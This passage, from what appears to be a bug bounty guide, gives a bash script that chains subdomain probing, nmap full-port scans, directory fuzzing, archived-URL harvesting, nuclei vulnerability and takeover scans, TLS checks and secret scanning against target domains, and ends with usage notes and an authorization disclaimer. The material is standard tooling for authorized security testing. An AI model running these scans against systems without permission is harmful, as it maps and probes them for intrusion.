    httpx -l "$OUTPUT_DIR/dns/resolved.txt" \
      -silent -status-code -title -tech-detect -content-length \
      -o "$OUTPUT_DIR/web/live_hosts.txt" 2>/dev/null
  fi

  LIVE=$(wc -l < "$OUTPUT_DIR/web/live_hosts.txt" 2>/dev/null || echo 0)
  info "Live hosts found: $LIVE"
}

phase3_ports() {
  step "PHASE 3: Port Scanning — $PRIMARY"

  if command -v nmap &>/dev/null; then
    info "Running nmap quick scan..."
    nmap -sV -sC -T4 \
      --min-rate 1000 \
      -oA "$OUTPUT_DIR/ports/nmap_quick_$PRIMARY" \
      "$PRIMARY" 2>/dev/null

    info "Running full port scan (background)..."
    nmap -sV -p- -T4 --min-rate 5000 \
      -oA "$OUTPUT_DIR/ports/nmap_full_$PRIMARY" \
      "$PRIMARY" 2>/dev/null &
  fi
}

phase4_web_enum() {
  step "PHASE 4: Web Enumeration"

  for domain in "${TARGETS[@]}"; do
    TARGET_URL="https://$domain"

    if command -v whatweb &>/dev/null; then
      info "Fingerprinting $domain..."
      whatweb -v "$TARGET_URL" > "$OUTPUT_DIR/web/whatweb_$domain.txt" 2>/dev/null
    fi

    info "Checking security headers for $domain..."
    curl -sIL "$TARGET_URL" > "$OUTPUT_DIR/web/headers_$domain.txt" 2>/dev/null

    if command -v ffuf &>/dev/null; then
      WORDLIST="/usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt"
      if [ -f "$WORDLIST" ]; then
        info "Directory fuzzing $domain..."
        ffuf -w "$WORDLIST" \
          -u "$TARGET_URL/FUZZ" \
          -mc 200,201,204,301,302,307,401,403 \
          -t 30 \
          -o "$OUTPUT_DIR/web/ffuf_$domain.json" \
          -of json \
          -s 2>/dev/null
      else
        warn "SecLists not found at $WORDLIST — skipping ffuf"
      fi
    fi
  done
}

phase5_history() {
  step "PHASE 5: Historical URL Extraction"

  for domain in "${TARGETS[@]}"; do
    if command -v waybackurls &>/dev/null; then
      info "Fetching wayback URLs for $domain..."
      waybackurls "$domain" > "$OUTPUT_DIR/endpoints/wayback_$domain.txt" 2>/dev/null
    fi

    if command -v gau &>/dev/null; then
      info "Fetching gau URLs for $domain..."
      gau "$domain" > "$OUTPUT_DIR/endpoints/gau_$domain.txt" 2>/dev/null
    fi
  done

  cat "$OUTPUT_DIR/endpoints/"*.txt 2>/dev/null | sort -u > "$OUTPUT_DIR/endpoints/all_urls.txt"

  grep -iE "\.(php|asp|aspx|jsp|json|xml|config|env|bak|sql|log|backup|yml|yaml)$" \
    "$OUTPUT_DIR/endpoints/all_urls.txt" > "$OUTPUT_DIR/endpoints/interesting_files.txt" 2>/dev/null

  cat "$OUTPUT_DIR/endpoints/all_urls.txt" | grep "=" | sort -u > "$OUTPUT_DIR/endpoints/params.txt" 2>/dev/null

  URLS=$(wc -l < "$OUTPUT_DIR/endpoints/all_urls.txt" 2>/dev/null || echo 0)
  PARAMS=$(wc -l < "$OUTPUT_DIR/endpoints/params.txt" 2>/dev/null || echo 0)
  info "Total URLs found: $URLS | Parameterized: $PARAMS"
}

phase6_vuln_scan() {
  step "PHASE 6: Automated Vulnerability Scanning"

  if command -v nuclei &>/dev/null; then
    info "Running nuclei on live hosts..."
    nuclei -l "$OUTPUT_DIR/web/live_hosts.txt" \
      -severity low,medium,high,critical \
      -o "$OUTPUT_DIR/vulns/nuclei_results.txt" \
      -silent 2>/dev/null

    FINDINGS=$(wc -l < "$OUTPUT_DIR/vulns/nuclei_results.txt" 2>/dev/null || echo 0)
    info "Nuclei findings: $FINDINGS"
  else
    warn "nuclei not installed — skipping automated vuln scan"
  fi
}

phase7_ssl() {
  step "PHASE 7: SSL/TLS Analysis"

  for domain in "${TARGETS[@]}"; do
    if command -v testssl.sh &>/dev/null; then
      info "Testing SSL/TLS for $domain..."
      testssl.sh --quiet --severity HIGH --wide "$domain" > "$OUTPUT_DIR/vulns/ssl_$domain.txt" 2>/dev/null
    elif command -v sslscan &>/dev/null; then
      info "sslscan for $domain..."
      sslscan "$domain:443" > "$OUTPUT_DIR/vulns/sslscan_$domain.txt" 2>/dev/null
    fi
  done
}

phase8_takeover() {
  step "PHASE 8: Subdomain Takeover Detection"

  if command -v subjack &>/dev/null; then
    info "Running subjack..."
    subjack -w "$OUTPUT_DIR/dns/resolved.txt" \
      -t 100 -timeout 30 -ssl \
      -o "$OUTPUT_DIR/vulns/takeovers.txt" 2>/dev/null
  fi

  if command -v nuclei &>/dev/null; then
    info "Running nuclei takeover templates..."
    nuclei -l "$OUTPUT_DIR/dns/resolved.txt" \
      -t ~/nuclei-templates/takeovers/ \
      -o "$OUTPUT_DIR/vulns/nuclei_takeovers.txt" \
      -silent 2>/dev/null
  fi
}

phase9_js_analysis() {
  step "PHASE 9: JavaScript File Analysis"

  if command -v katana &>/dev/null; then
    info "Crawling and collecting JS files..."
    for domain in "${TARGETS[@]}"; do
      katana -u "https://$domain" -js-crawl -d 3 -silent 2>/dev/null | \
        grep "\.js$" >> "$OUTPUT_DIR/js/jsfiles.txt"
    done
    sort -u "$OUTPUT_DIR/js/jsfiles.txt" -o "$OUTPUT_DIR/js/jsfiles.txt"
    JS_COUNT=$(wc -l < "$OUTPUT_DIR/js/jsfiles.txt" 2>/dev/null || echo 0)
    info "JS files found: $JS_COUNT"
  fi

  if command -v trufflehog &>/dev/null; then
    info "Scanning for secrets with trufflehog..."
    trufflehog filesystem --path="$OUTPUT_DIR" --json > "$OUTPUT_DIR/vulns/secrets.json" 2>/dev/null
  fi
}

generate_report() {
  step "Generating Summary Report..."

  REPORT="$OUTPUT_DIR/REPORT_${PRIMARY}_$(date +%Y%m%d).md"
  cat > "$REPORT" << REPORTEOF
# Bug Bounty Recon Report
**Target:** $PRIMARY
**Date:** $(date)
**Output Dir:** $OUTPUT_DIR

## Subdomain Discovery
- Total found: $(wc -l < "$OUTPUT_DIR/subs/all_subs.txt" 2>/dev/null || echo 0)
- Resolved: $(wc -l < "$OUTPUT_DIR/dns/resolved.txt" 2>/dev/null || echo 0)
- Live HTTP(S): $(wc -l < "$OUTPUT_DIR/web/live_hosts.txt" 2>/dev/null || echo 0)

## URLs & Endpoints
- Total URLs: $(wc -l < "$OUTPUT_DIR/endpoints/all_urls.txt" 2>/dev/null || echo 0)
- Interesting files: $(wc -l < "$OUTPUT_DIR/endpoints/interesting_files.txt" 2>/dev/null || echo 0)
- Parameterized URLs: $(wc -l < "$OUTPUT_DIR/endpoints/params.txt" 2>/dev/null || echo 0)

## Vulnerability Findings
$(cat "$OUTPUT_DIR/vulns/nuclei_results.txt" 2>/dev/null | head -50 || echo "No findings yet")

## Files
- Subdomains: $OUTPUT_DIR/subs/all_subs.txt
- Live hosts: $OUTPUT_DIR/web/live_hosts.txt
- Endpoints: $OUTPUT_DIR/endpoints/all_urls.txt
- Nuclei results: $OUTPUT_DIR/vulns/nuclei_results.txt
- Nmap results: $OUTPUT_DIR/ports/
REPORTEOF

  info "Report saved: $REPORT"
}

main() {
  banner
  check_tools
  setup_dirs

  phase1_subdomains
  phase2_dns
  phase3_ports
  phase4_web_enum
  phase5_history
  phase6_vuln_scan
  phase7_ssl
  phase8_takeover
  phase9_js_analysis

  generate_report

  echo ""
  echo -e "${GRN}══════════════════════════════════════${NC}"
  echo -e "${GRN}  Recon Complete!${NC}"
  echo -e "${GRN}  Results: $OUTPUT_DIR${NC}"
  echo -e "${GRN}══════════════════════════════════════${NC}"
}

main "$@"
```

### Usage

```bash
chmod +x bb_recon_TARGET.sh
bash bb_recon_TARGET.sh

# Or with sudo for UDP/SYN scans
sudo bash bb_recon_TARGET.sh
```

**Prerequisites:** Install tools with `go install` for Go tools and `apt install` for system tools. SecLists wordlists: `git clone https://github.com/danielmiessler/SecLists /usr/share/wordlists/SecLists`. Nuclei templates: `nuclei -update-templates`. The script auto-detects which tools are installed and skips missing ones.

---

## Disclaimer

**For authorized security research only. Always get written permission before testing.**

All commands and techniques in this document are for educational and authorized penetration testing purposes. Unauthorized testing of systems you don't own or have explicit written permission to test is illegal.

---
